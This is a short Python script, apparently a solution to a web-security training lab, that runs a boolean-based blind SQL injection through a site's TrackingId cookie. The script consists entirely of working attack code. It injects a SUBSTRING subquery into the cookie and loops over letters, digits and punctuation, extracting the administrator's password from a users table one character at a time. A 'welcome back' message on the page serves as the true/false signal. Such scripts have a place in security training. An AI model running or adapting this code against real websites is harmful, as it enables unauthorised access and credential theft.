from requests import Session
from string import digits, ascii_letters, punctuation

BASE_URL = ''
PATH = ''

# SQLi in Tracking ID of website
# Oracle
TRACKING_ID = "MfI1Ftgs9J7FJLIl' AND SUBSTRING((SELECT Password FROM users WHERE Username = 'administrator'), {char_no}, 1) = '{letter}"

with Session() as s:

    password = ''
    full_path = BASE_URL + PATH
    letters = ascii_letters + digits + punctuation
    for i in range(23):
        for index, letter in enumerate(letters):
            tracking_id = TRACKING_ID.format(
                char_no=len(password) + 1,
                letter=letter
            )
            response = s.get(full_path, cookies={
                'TrackingId': tracking_id
            })

            if 'welcome back!' in response.content.decode().lower():
                password += letter
                print(letter, end="")
                break
        else:
            break

    print('Length of password = ', len(password))
    print('Password:', password)
